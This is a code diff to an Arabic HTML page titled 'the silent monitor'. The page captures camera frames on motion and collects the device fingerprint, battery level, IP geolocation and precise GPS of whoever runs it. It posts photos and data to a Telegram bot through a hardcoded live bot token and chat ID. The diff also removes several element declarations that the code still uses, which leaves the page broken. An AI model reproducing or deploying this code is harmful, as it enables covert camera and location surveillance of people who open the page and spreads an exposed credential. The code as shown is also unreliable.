@@ -9,8 +9,8 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #1a202c; /* Dark background */
-            color: #e2e8f0; /* Light text */
+            background-color: #1a202c;
+            color: #e2e8f0;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
@@ -19,9 +19,9 @@
             max-width: 900px;
             margin: 2rem auto;
             padding: 1.5rem;
-            background-color: #2d3748; /* Darker container */
+            background-color: #2d3748;
             border-radius: 0.5rem;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         .header {
             background: linear-gradient(135deg, #4b6cb7, #182848);
@@ -34,7 +34,7 @@
         .section-title {
             font-size: 1.25rem;
             font-weight: bold;
-            color: #63b3ed; /* Blue accent */
+            color: #63b3ed;
             margin-bottom: 1rem;
             border-bottom: 2px solid #4299e1;
             padding-bottom: 0.5rem;
@@ -55,14 +55,21 @@
             transition: background-color 0.2s;
         }
         .btn-primary {
-            background-color: #4299e1; /* Blue */
+            background-color: #4299e1;
             color: white;
         }
         .btn-primary:hover {
             background-color: #3182ce;
         }
+        .btn-secondary {
+            background-color: #4a5568;
+            color: white;
+        }
+        .btn-secondary:hover {
+            background-color: #2d3748;
+        }
         .btn-danger {
-            background-color: #e53e3e; /* Red */
+            background-color: #e53e3e;
             color: white;
         }
         .btn-danger:hover {
@@ -82,12 +89,6 @@
             padding: 1rem;
             margin-bottom: 1rem;
         }
-        .info-box p {
-            margin-bottom: 0.5rem;
-        }
-        .info-box p:last-child {
-            margin-bottom: 0;
-        }
         .hidden {
             display: none;
         }
@@ -103,9 +104,11 @@
         <div class="mb-6">
             <h2 class="section-title">إعدادات التليجرام</h2>
             <div class="info-box">
-                <p><strong>توكن البوت (TELEGRAM_BOT_TOKEN):</strong> <span id="botTokenDisplay">غير محدد</span></p>
-                <p><strong>معرف الدردشة (TELEGRAM_CHAT_ID):</strong> <span id="chatIdDisplay">غير محدد</span></p>
-                <p class="text-sm text-gray-400">يرجى تعديل قيم <code>TELEGRAM_BOT_TOKEN</code> و <code>TELEGRAM_CHAT_ID</code> في كود JavaScript.</p>
+                <p><strong>توكن البوت:</strong> <span id="botTokenDisplay">غير محدد</span></p>
+                <p><strong>معرف الدردشة:</strong> <span id="chatIdDisplay">غير محدد</span></p>
+                <p><strong>حالة الاتصال:</strong> <span id="telegramStatus">لم يتم الاختبار</span></p>
+                <button id="testTelegramBtn" class="btn btn-secondary mt-2 text-sm"><i class="fas fa-paper-plane ml-1"></i> اختبار إرسال رسالة نصية</button>
+                <p class="text-sm text-gray-400 mt-2">تأكد من أنك بدأت المحادثة مع البوت على تليجرام (أرسل له /start)</p>
             </div>
         </div>
 
@@ -136,93 +139,145 @@
     </div>
 
     <script>
-        // --- إعدادات التليجرام --- //
-        const TELEGRAM_BOT_TOKEN = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k'; // <--- استبدل هذا بالتوكن الخاص بك
-        const TELEGRAM_CHAT_ID = '6612813200';     // <--- استبدل هذا بمعرف الدردشة الخاص بك
+        // --- إعدادات التليجرام (تأكد من صحتها) --- //
+        const TELEGRAM_BOT_TOKEN = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
+        const TELEGRAM_CHAT_ID = '6612813200';
 
         // --- عناصر DOM --- //
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const motionCanvas = document.getElementById('motionCanvas');
         const captureButton = document.getElementById('captureButton');
+        const testTelegramBtn = document.getElementById('testTelegramBtn');
         const statusDiv = document.getElementById('status');
-        const ipAddressSpan = document.getElementById('ipAddress');
-        const locationInfoSpan = document.getElementById('locationInfo');
-        const preciseLocationInfoSpan = document.getElementById('preciseLocationInfo');
-        const batteryInfoSpan = document.getElementById('batteryInfo');
-        const deviceInfoSpan = document.getElementById('deviceInfo');
         const logDiv = document.getElementById('log');
         const botTokenDisplay = document.getElementById('botTokenDisplay');
         const chatIdDisplay = document.getElementById('chatIdDisplay');
+        const telegramStatusSpan = document.getElementById('telegramStatus');
 
         // --- متغيرات الكاميرا والحركة --- //
-        let stream;
-        let context = canvas.getContext('2d');
-        let motionContext = motionCanvas.getContext('2d');
+        let stream = null;
+        let videoReady = false;
+        let canvasContext = null;
+        let motionContext = null;
         let lastFrameData = null;
-        const MOTION_THRESHOLD = 1500; // قيمة حساسية اكتشاف الحركة
-        const MOTION_INTERVAL = 5000; // الفاصل الزمني بين فحوصات الحركة (بالمللي ثانية)
-        const CAPTURE_COOLDOWN = 30000; // فترة التهدئة بعد الالتقاط (بالمللي ثانية)
+        const MOTION_THRESHOLD = 1500;
+        const MOTION_INTERVAL = 5000;
+        const CAPTURE_COOLDOWN = 30000;
         let lastCaptureTime = 0;
 
-        // --- وظائف المساعدة --- //
+        // --- وظائف السجل المحسنة --- //
         function logMessage(message, type = 'info') {
             const p = document.createElement('p');
             p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
             if (type === 'error') p.style.color = '#e53e3e';
             if (type === 'success') p.style.color = '#48bb78';
-            logDiv.prepend(p); // Add to top
-            if (logDiv.children.length > 50) {
-                logDiv.removeChild(logDiv.lastChild);
+            if (type === 'warning') p.style.color = '#f6ad55';
+            logDiv.prepend(p);
+            if (logDiv.children.length > 50) logDiv.removeChild(logDiv.lastChild);
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+
+        // --- التحقق من بيئة التشغيل (CORS) --- //
+        function checkEnvironment() {
+            if (window.location.protocol === 'file:') {
+                logMessage('⚠️ تحذير: الصفحة تعمل من ملف محلي (file://). قد يمنع المتصفح طلبات Telegram. يفضل تشغيلها عبر خادم محلي (مثل Live Server).', 'warning');
+                statusDiv.innerHTML = '⚠️ يعمل من ملف محلي. قد لا تعمل الإرسالات. استخدم خادم HTTP.';
+            } else {
+                logMessage('بيئة التشغيل: ' + window.location.protocol + '//' + window.location.hostname, 'info');
             }
         }
 
-        // --- تهيئة الكاميرا --- //
+        // --- اختبار اتصال التليجرام (إرسال رسالة نصية تجريبية) --- //
+        async function testTelegramConnection() {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
+                logMessage('❌ فشل الاختبار: التوكن أو المعرف غير مضبوط.', 'error');
+                telegramStatusSpan.textContent = '❌ غير مضبوط';
+                return false;
+            }
+            telegramStatusSpan.textContent = 'جاري الاختبار...';
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const testText = `🔄 اختبار اتصال من المراقب الصامت الساعة ${new Date().toLocaleString('ar-EG')}`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: testText })
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    logMessage('✅ اختبار التليجرام ناجح: تم إرسال رسالة نصية.', 'success');
+                    telegramStatusSpan.textContent = '✅ يعمل';
+                    return true;
+                } else {
+                    logMessage(`❌ فشل اختبار التليجرام: ${data.description}`, 'error');
+                    telegramStatusSpan.textContent = `❌ خطأ: ${data.description.substring(0, 30)}`;
+                    return false;
+                }
+            } catch (err) {
+                logMessage(`❌ فشل الاتصال بواجهة التليجرام: ${err.message}. تأكد من اتصال الإنترنت وأن المتصفح لا يحظر الطلبات (CORS).`, 'error');
+                telegramStatusSpan.textContent = '❌ خطأ شبكة أو CORS';
+                return false;
+            }
+        }
+
+        // --- تهيئة الكاميرا مع التحقق من الجاهزية --- //
         async function initCamera() {
             logMessage('جاري طلب الوصول إلى الكاميرا...');
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); // استخدام الكاميرا الخلفية إن وجدت
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    motionCanvas.width = video.videoWidth;
-                    motionCanvas.height = video.videoHeight;
-                    logMessage('تم تهيئة الكاميرا بنجاح.', 'success');
-                    statusDiv.textContent = 'الكاميرا جاهزة. جاري المراقبة...';
-                    setInterval(detectMotion, MOTION_INTERVAL);
+                    // تأخير صغير للتأكد من أن الفيديو يعرض الإطار الأول
+                    setTimeout(() => {
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            motionCanvas.width = video.videoWidth;
+                            motionCanvas.height = video.videoHeight;
+                            canvasContext = canvas.getContext('2d');
+                            motionContext = motionCanvas.getContext('2d');
+                            videoReady = true;
+                            logMessage(`تم تهيئة الكاميرا بنجاح (${video.videoWidth}x${video.videoHeight})`, 'success');
+                            statusDiv.textContent = 'الكاميرا جاهزة. جاري المراقبة...';
+                            // بدء كشف الحركة بعد الجاهزية
+                            setInterval(() => { if (videoReady) detectMotion(); }, MOTION_INTERVAL);
+                        } else {
+                            logMessage('خطأ: أبعاد الفيديو صفرية، حاول مرة أخرى.', 'error');
+                        }
+                    }, 500);
                 };
             } catch (err) {
                 logMessage(`خطأ في الوصول إلى الكاميرا: ${err.name} - ${err.message}`, 'error');
-                statusDiv.textContent = 'فشل الوصول إلى الكاميرا. يرجى التأكد من الصلاحيات.';
+                statusDiv.textContent = 'فشل الوصول إلى الكاميرا. امنح الصلاحية وحاول تحديث الصفحة.';
             }
         }
 
-        // --- التقاط صورة --- //
+        // --- التقاط صورة (تتطلب جاهزية الفيديو) --- //
         function captureFrame() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/jpeg', 0.8);
+            if (!videoReady || !canvasContext) {
+                logMessage('لا يمكن التقاط الصورة: الكاميرا غير جاهزة.', 'error');
+                return null;
+            }
+            canvasContext.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.7);
         }
 
-        // --- اكتشاف الحركة --- //
+        // --- كشف الحركة --- //
         function detectMotion() {
-            if (!video.srcObject || video.paused || video.ended) return;
-
+            if (!videoReady || !motionContext || !video.srcObject) return;
             motionContext.drawImage(video, 0, 0, motionCanvas.width, motionCanvas.height);
             const currentFrameData = motionContext.getImageData(0, 0, motionCanvas.width, motionCanvas.height).data;
-
             if (lastFrameData) {
                 let diff = 0;
                 for (let i = 0; i < currentFrameData.length; i += 4) {
-                    // مقارنة قيم RGB
                     diff += Math.abs(currentFrameData[i] - lastFrameData[i]);
-                    diff += Math.abs(currentFrameData[i + 1] - lastFrameData[i + 1]);
-                    diff += Math.abs(currentFrameData[i + 2] - lastFrameData[i + 2]);
+                    diff += Math.abs(currentFrameData[i+1] - lastFrameData[i+1]);
+                    diff += Math.abs(currentFrameData[i+2] - lastFrameData[i+2]);
                 }
-                // يمكن تعديل العتبة بناءً على حجم الفيديو وحساسية الاكتشاف المطلوبة
                 if (diff > MOTION_THRESHOLD && (Date.now() - lastCaptureTime > CAPTURE_COOLDOWN)) {
-                    logMessage('تم اكتشاف حركة!', 'info');
+                    logMessage('🔔 تم اكتشاف حركة!', 'info');
                     statusDiv.textContent = 'تم اكتشاف حركة! جاري الإرسال...';
                     lastCaptureTime = Date.now();
                     sendCaptureAndData();
@@ -231,189 +286,155 @@
             lastFrameData = currentFrameData;
         }
 
-        // --- جمع معلومات الجهاز --- //
-        function collectDeviceInfo() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                pixelRatio: window.devicePixelRatio,
-                orientation: window.screen.orientation ? window.screen.orientation.type : 'غير معروف'
-            };
-            deviceInfoSpan.textContent = `OS: ${info.platform}, Browser: ${info.userAgent.split(')')[0].split('(')[1]}, Mem: ${info.deviceMemory}, Cores: ${info.hardwareConcurrency}, Screen: ${info.screenWidth}x${info.screenHeight}`;
-            return info;
-        }
-
-        // --- جمع معلومات البطارية --- //
-        async function collectBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? 'نعم' : 'لا';
-                    batteryInfoSpan.textContent = `المستوى: ${level}%, الشحن: ${charging}`;
-                    if (level <= 10 && !battery.charging) {
-                        logMessage('البطارية منخفضة جداً! جاري إرسال تنبيه.', 'error');
-                        sendTextToTelegram(`⚠️ تنبيه بطارية منخفضة! المستوى: ${level}%، الشحن: ${charging}`);
-                    }
-                    return { level, charging };
-                } catch (err) {
-                    logMessage(`خطأ في قراءة معلومات البطارية: ${err.message}`, 'error');
-                    batteryInfoSpan.textContent = 'غير متاح';
-                    return null;
-                }
-            } else {
-                batteryInfoSpan.textContent = 'غير مدعوم';
-                return null;
-            }
-        }
-
-        // --- جلب معلومات IP والموقع --- //
-        async function fetchIPAndLocation() {
+        // --- جمع معلومات الجهاز (مع مرونة ضد الأخطاء) --- //
+        async function collectDeviceInfoSafe() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+                const info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                };
+                deviceInfoSpan.textContent = `OS: ${info.platform}, Browser: ${info.userAgent.split(')')[0].split('(')[1]}, Mem: ${info.deviceMemory}, Cores: ${info.hardwareConcurrency}, Screen: ${info.screenWidth}x${info.screenHeight}`;
+                return info;
+            } catch(e) { return { userAgent: 'غير متاح' }; }
+        }
+
+        async function collectBatteryInfoSafe() {
+            if (!('getBattery' in navigator)) { batteryInfoSpan.textContent = 'غير مدعوم'; return null; }
+            try {
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const charging = battery.charging ? 'نعم' : 'لا';
+                batteryInfoSpan.textContent = `المستوى: ${level}%, الشحن: ${charging}`;
+                if (level <= 10 && !battery.charging) sendTextToTelegram(`⚠️ تنبيه بطارية منخفضة: ${level}%`);
+                return { level, charging };
+            } catch(e) { batteryInfoSpan.textContent = 'خطأ في القراءة'; return null; }
+        }
+
+        async function fetchIPAndLocationSafe() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
                 const ip = ipData.ip;
                 ipAddressSpan.textContent = ip;
-
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const locationData = await locationResponse.json();
-                const locInfo = `${locationData.country_name || ''}, ${locationData.city || ''}, ISP: ${locationData.org || ''}`;
-                locationInfoSpan.textContent = locInfo;
-                return { ip, ...locationData };
-            } catch (err) {
-                logMessage(`خطأ في جلب معلومات IP/الموقع: ${err.message}`, 'error');
+                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locData = await locRes.json();
+                const locInfo = `${locData.country_name || ''}, ${locData.city || ''}, ISP: ${locData.org || ''}`;
+                locationInfoSpan.textContent = locInfo || 'غير متاح';
+                return { ip, ...locData };
+            } catch(e) {
                 ipAddressSpan.textContent = 'فشل التحميل';
                 locationInfoSpan.textContent = 'فشل التحميل';
                 return null;
             }
         }
 
-        // --- جلب الموقع الدقيق (GPS) --- //
-        async function fetchPreciseLocation() {
+        async function fetchPreciseLocationSafe() {
             return new Promise((resolve) => {
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            const preciseLoc = `خط العرض: ${latitude}, خط الطول: ${longitude}, الدقة: ±${accuracy} متر`;
-                            preciseLocationInfoSpan.textContent = preciseLoc;
-                            resolve({ latitude, longitude, accuracy });
-                        },
-                        (error) => {
-                            logMessage(`خطأ في جلب الموقع الدقيق: ${error.message}`, 'error');
-                            preciseLocationInfoSpan.textContent = 'غير متاح أو تم رفض الصلاحية';
-                            resolve(null);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                } else {
-                    preciseLocationInfoSpan.textContent = 'غير مدعوم';
-                    resolve(null);
-                }
+                if (!('geolocation' in navigator)) { preciseLocationInfoSpan.textContent = 'غير مدعوم'; resolve(null); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        preciseLocationInfoSpan.textContent = `خط العرض: ${latitude}, خط الطول: ${longitude}, دقة: ±${accuracy}م`;
+                        resolve({ latitude, longitude, accuracy });
+                    },
+                    (err) => { preciseLocationInfoSpan.textContent = `رفض المستخدم أو خطأ: ${err.message}`; resolve(null); },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
             });
         }
 
-        // --- إرسال نص إلى التليجرام --- //
+        // --- إرسال نص إلى التليجرام (دالة مساعدة) --- //
         async function sendTextToTelegram(text) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
-                logMessage('خطأ: توكن البوت أو معرف الدردشة غير محدد. يرجى تعديل الكود.', 'error');
-                return;
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                logMessage('❌ لم يتم إرسال النص: التوكن أو المعرف غير محدد.', 'error');
+                return false;
             }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const params = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            };
             try {
-                await fetch(url, {
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(params)
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
                 });
-                logMessage('تم إرسال رسالة نصية إلى التليجرام.', 'success');
-            } catch (error) {
-                logMessage(`فشل إرسال الرسالة النصية إلى التليجرام: ${error.message}`, 'error');
-            }
+                const data = await res.json();
+                if (data.ok) { logMessage('📨 تم إرسال رسالة نصية.', 'success'); return true; }
+                else { logMessage(`⚠️ فشل إرسال النص: ${data.description}`, 'error'); return false; }
+            } catch(e) { logMessage(`❌ خطأ شبكة في إرسال النص: ${e.message}`, 'error'); return false; }
         }
 
-        // --- إرسال صورة إلى التليجرام --- //
-        async function sendPhotoToTelegram(photoBlob, caption) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
-                logMessage('خطأ: توكن البوت أو معرف الدردشة غير محدد. يرجى تعديل الكود.', 'error');
-                return;
-            }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', photoBlob, 'capture.jpg');
-            formData.append('caption', caption);
-
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                logMessage('تم إرسال الصورة إلى التليجرام.', 'success');
-            } catch (error) {
-                logMessage(`فشل إرسال الصورة إلى التليجرام: ${error.message}`, 'error');
-            }
-        }
-
-        // --- إرسال الالتقاط والبيانات --- //
+        // --- إرسال الصورة + البيانات (المحور الأساسي للإصلاح) --- //
         async function sendCaptureAndData() {
-            logMessage('جاري جمع البيانات والتقاط الصورة للإرسال...');
-            statusDiv.textContent = 'جاري جمع البيانات والتقاط الصورة...';
-
+            if (!videoReady) { logMessage('⚠️ الكاميرا غير جاهزة بعد، حاول مرة أخرى.', 'warning'); return; }
+            logMessage('📸 بدء عملية الالتقاط والإرسال...');
+            statusDiv.textContent = 'جاري التقاط الصورة وجمع البيانات...';
+            
+            // 1. التقاط الصورة
             const imageDataURL = captureFrame();
+            if (!imageDataURL) { logMessage('فشل التقاط الصورة', 'error'); statusDiv.textContent = 'فشل الالتقاط'; return; }
             const photoBlob = await (await fetch(imageDataURL)).blob();
-
-            const deviceInfo = collectDeviceInfo();
-            const batteryInfo = await collectBatteryInfo();
-            const ipLocation = await fetchIPAndLocation();
-            const preciseLocation = await fetchPreciseLocation();
-
+            
+            // 2. جمع البيانات بشكل متوازٍ مع التسامح مع الأخطاء
+            const [device, battery, ipLoc, preciseLoc] = await Promise.allSettled([
+                collectDeviceInfoSafe(),
+                collectBatteryInfoSafe(),
+                fetchIPAndLocationSafe(),
+                fetchPreciseLocationSafe()
+            ]);
+            
+            // 3. بناء النص التعليقي
             let caption = `📸 *التقاط جديد من المراقب الصامت* 📸\n\n`;
-            caption += `*معلومات الجهاز:*\n`;
-            caption += `- المتصفح: ${deviceInfo.userAgent}\n`;
-            caption += `- المنصة: ${deviceInfo.platform}\n`;
-            caption += `- الشاشة: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
-            if (batteryInfo) {
-                caption += `*البطارية:* ${batteryInfo.level}%, شحن: ${batteryInfo.charging}\n`;
+            caption += `*الجهاز:* ${device.value?.userAgent?.substring(0, 80) || 'غير معروف'}\n`;
+            if (battery.value) caption += `*البطارية:* ${battery.value.level}%, شحن: ${battery.value.charging}\n`;
+            if (ipLoc.value && ipLoc.value.country_name) caption += `*الموقع (IP):* ${ipLoc.value.country_name}, ${ipLoc.value.city || ''}\n`;
+            if (preciseLoc.value) caption += `*GPS:* ${preciseLoc.value.latitude}, ${preciseLoc.value.longitude} (دقة ${preciseLoc.value.accuracy}m)\n`;
+            caption += `\n_${new Date().toLocaleString('ar-EG')}_`;
+            
+            // 4. إرسال الصورة (حتى لو فشل بعض البيانات)
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'capture.jpg');
+                formData.append('caption', caption);
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                const data = await res.json();
+                if (data.ok) {
+                    logMessage('✅ تم إرسال الصورة والبيانات إلى تليجرام بنجاح.', 'success');
+                    statusDiv.textContent = 'تم الإرسال بنجاح. جاري المراقبة...';
+                } else {
+                    logMessage(`❌ فشل إرسال الصورة: ${data.description}`, 'error');
+                    statusDiv.textContent = `خطأ: ${data.description.substring(0, 50)}`;
+                }
+            } catch(err) {
+                logMessage(`❌ فشل الاتصال أثناء إرسال الصورة: ${err.message}`, 'error');
+                statusDiv.textContent = 'فشل الإرسال (تحقق من الإنترنت و CORS)';
             }
-            if (ipLocation) {
-                caption += `*الموقع (IP):* ${ipLocation.country_name}, ${ipLocation.city}, ISP: ${ipLocation.org}\n`;
-                caption += `  [خرائط جوجل](https://www.google.com/maps?q=${ipLocation.latitude},${ipLocation.longitude})\n`;
-            }
-            if (preciseLocation) {
-                caption += `*الموقع (GPS):* خط عرض: ${preciseLocation.latitude}, خط طول: ${preciseLocation.longitude}, دقة: ±${preciseLocation.accuracy}م\n`;
-                caption += `  [خرائط جوجل](https://www.google.com/maps?q=${preciseLocation.latitude},${preciseLocation.longitude})\n`;
-            }
-            caption += `\n_تم الإرسال في: ${new Date().toLocaleString('ar-EG')}_`;
-
-            await sendPhotoToTelegram(photoBlob, caption);
-            statusDiv.textContent = 'تم الإرسال بنجاح. جاري المراقبة...';
-            logMessage('تم إرسال البيانات والصورة إلى التليجرام.', 'success');
         }
 
         // --- التهيئة عند تحميل الصفحة --- //
-        document.addEventListener('DOMContentLoaded', () => {
-            botTokenDisplay.textContent = TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' ? 'غير محدد' : TELEGRAM_BOT_TOKEN.substring(0, 5) + '...';
-            chatIdDisplay.textContent = TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID' ? 'غير محدد' : TELEGRAM_CHAT_ID;
-
-            initCamera();
-            collectDeviceInfo();
-            fetchIPAndLocation();
-            collectBatteryInfo(); // Initial battery check
-            setInterval(collectBatteryInfo, 60000); // Check battery every minute
-
-            captureButton.addEventListener('click', sendCaptureAndData);
+        document.addEventListener('DOMContentLoaded', async () => {
+            // عرض التوكن بشكل مقنع
+            botTokenDisplay.textContent = TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 8) + '...' : 'غير محدد';
+            chatIdDisplay.textContent = TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID : 'غير محدد';
+            
+            checkEnvironment();
+            await initCamera();
+            
+            // جمع البيانات الأولية
+            collectDeviceInfoSafe();
+            fetchIPAndLocationSafe();
+            collectBatteryInfoSafe();
+            setInterval(collectBatteryInfoSafe, 60000);
+            
+            // اختبار اتصال التليجرام تلقائياً (لكن لا ننتظره)
+            testTelegramConnection();
+            
+            // ربط الأزرار
+            captureButton.addEventListener('click', () => { sendCaptureAndData(); });
+            testTelegramBtn.addEventListener('click', () => { testTelegramConnection(); });
         });
     </script>
 </body>
-</html>
 </html>
